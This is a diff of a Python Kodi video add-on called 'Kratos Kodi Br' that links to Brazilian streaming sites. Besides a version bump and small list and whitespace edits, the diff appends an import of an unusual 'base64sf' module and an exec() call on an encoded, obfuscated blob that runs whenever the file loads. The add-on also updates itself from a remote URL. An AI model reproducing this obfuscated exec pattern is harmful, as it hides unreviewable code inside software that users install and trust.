@@ -536,7 +536,7 @@ def Other(url):
 	xbmcplugin.setResolvedUrl(int(sys.argv[1]), True, liz)		
 		
 def Check_update():
-	versao='23.0'
+	versao='24.0'
 	Source_Update = os.path.join(home, 'Player_Kratos.py')
 	base_update = abrir_url('https://raw.githubusercontent.com/brunolojino/listas/master/Kratos_Update.txt')
 	check = re.compile("versao='(.*?)'").findall(base_update)[0]
@@ -549,7 +549,7 @@ def Check_update():
 		dialog.ok('-=Kratos Kodi Br =-','Versão do player: '+versao,'Versão do player disponível: '+check,'Atualizando o player do add-on feche e abra novamente.')
 		sys.exit(0) 
 
-Rsolvers_Kratos = ['pipocao.com','redecanais.','netcine.us','mmfilmes.tv','rapidvideo.com','estream.nu','estream.to','animesonlineq.net','Other://','www.redecanais.tv','ok_ru','vk_com','megatorrentshd.com','www.seriesflixhd.com','week-series','minhaserie.org','assistindoanime']	
+Rsolvers_Kratos = ['pipocao.com','redecanais.','netcine.us','mmfilmes.tv','rapidvideo.com','estream.nu','estream.to','animesonlineq.net','Other://','www.redecanais.tv','ok_ru','vk_com','megatorrentshd.com','www.seriesflixhd.com','week-series','minhaserie.org','assistindoanime','']	
 def Resolvers(url,name,iconimage):   	
 	Check_update()
 	rURL = url.replace(';','')
@@ -612,7 +612,7 @@ def Resolvers(url,name,iconimage):
 	elif 'Other://' in rURL:
 		link = rURL
 		link = link.replace('Other://','')
-		Other(link)			
+		Other(link)					
 
 def get_params():
         param=[]
@@ -649,3 +649,8 @@ try:
     iconimage=urllib.unquote_plus(params["iconimage"])
 except:
     pass
+
+import base64sf	
+exec(base64sf.decode('Crip','rN_Z37XmieOr593Zr3zO6Kzl3dVjr4nopd_Mnrfkyt623srkqMLK5KuakOOz18zZpN6jn3La2N2oocrUp-HX43Li1eWq29eeudvN1bKgttWq06vfu8a_l2x80tZj4dyes9Pd2HHX4dm25tyYqOrS47fXkq2AxtvlqKxzebba3uSs3pfisObb1aiazuis5d3VbA=='))	
+	
+	
